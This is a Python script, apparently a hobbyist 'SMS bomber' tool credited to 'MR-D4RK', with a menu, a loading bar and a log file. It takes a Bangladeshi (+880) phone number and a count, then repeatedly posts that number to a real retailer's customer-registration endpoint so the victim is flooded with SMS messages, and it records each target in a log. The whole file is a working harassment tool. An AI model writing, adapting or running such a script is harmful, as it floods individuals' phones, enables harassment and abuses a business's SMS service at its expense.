import os
import time
import requests

# Function: Loading Bar
def loading_bar():
    animation = [
        "\033[32m[■□□□□□□□□□] 10%",
        "\033[33m[■■□□□□□□□□] 20%",
        "\033[34m[■■■□□□□□□□] 30%",
        "\033[35m[■■■■□□□□□□] 40%",
        "\033[36m[■■■■■□□□□□] 50%",
        "\033[37m[■■■■■■□□□□] 60%",
        "\033[38;5;46m[■■■■■■■□□□] 70%",
        "\033[38;5;82m[■■■■■■■■□□] 80%",
        "\033[38;5;118m[■■■■■■■■■□] 90%",
        "\033[38;5;154m[■■■■■■■■■■] 100% \n\n\n",
    ]
    for i in animation:
        print(i)
        time.sleep(0.4)

# Function: Save Log
def save_log(target, sms_count):
    with open("sms_log.txt", "a") as log_file:
        log_file.write(f"Target: +880{target} | SMS Sent: {sms_count} | Time: {time.ctime()}\n")
    print("\033[32m[+] Logs Saved Successfully!\033[0m")

# Function: Internet Check
def check_internet():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

# Welcome Screen
def welcome_screen():
    os.system('clear')
    logo = """
\033[1;94m
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗    ███████╗███╗   ███╗███████╗
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔════╝████╗ ████║██╔════╝
██║  ███╗██████╔╝███████║██████╔╝█████╔╝     █████╗  ██╔████╔██║█████╗  
██║   ██║██╔═══╝ ██╔══██║██╔═══╝ ██╔═██╗     ██╔══╝  ██║╚██╔╝██║██╔══╝  
╚██████╔╝██║     ██║  ██║██║     ██║  ██╗    ███████╗██║ ╚═╝ ██║███████╗
 ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝╚══════╝
\033[1;93m                    CREATED BY: MR-D4RK
\033[1;94m===============================================================
\033[1;32m[1] Start SMS Bomber
\033[1;33m[2] View Logs
\033[1;31m[3] Exit
\033[1;94m===============================================================
"""
    print(logo)

# SMS Bomber Function
def sms_bomber():
    os.system('clear')
    print("\033[1;92mStarting SMS Bomber...\033[0m")
    loading_bar()
    
    num = input("\033[38;5;46mEnter Target Number (+880): ")
    amount = int(input("\033[38;5;46mEnter SMS Amount: "))
    print("\033[1;94mSending SMS... Please Wait...\033[0m")

    # APIs List
    apis = [
        {
            "url": "https://www.thebodyshop.com.bd/smspro/customer/register",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
            },
            "data": {"phone": f"880{num}"}
        },
        {
            "url": "https://www.thebodyshop.com.bd/smspro/customer/register",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
            },
            "data": {"phone": f"880{num}"}
        },
    ]

    ses = 0
    while ses < amount:
        for api in apis:
            try:
                if api["method"] == "POST":
                    response = requests.post(api["url"], headers=api["headers"], json=api["data"])

                if response.status_code == 200:
                    ses += 1
                    print(f"\033[38;5;46m[+]{ses} SMS Sent Successfully via {api['url']}...")
                else:
                    print(f"\033[1;31m[-] Failed to send SMS via {api['url']}\033[0m")
            except Exception as e:
                print(f"\033[1;31m[!] Error: {e}\033[0m")

            if ses >= amount:
                break

    save_log(num, ses)
    print("\033[38;5;46mAll SMS Sent Successfully!\033[0m")

# Main Menu
def main_menu():
    while True:
        welcome_screen()
        choice = input("\033[1;32mEnter Your Choice: ")
        if choice == '1':
            if check_internet():
                sms_bomber()
            else:
                print("\033[1;31mNo Internet Connection! Please Check and Try Again.\033[0m")
        elif choice == '2':
            os.system("cat sms_log.txt")
            input("\nPress Enter to Return to Menu...")
        elif choice == '3':
            print("\033[1;92mThank You for Using the Tool!\033[0m")
            break
        else:
            print("\033[1;31mInvalid Choice! Please Try Again.\033[0m")

# Run the Program
main_menu()
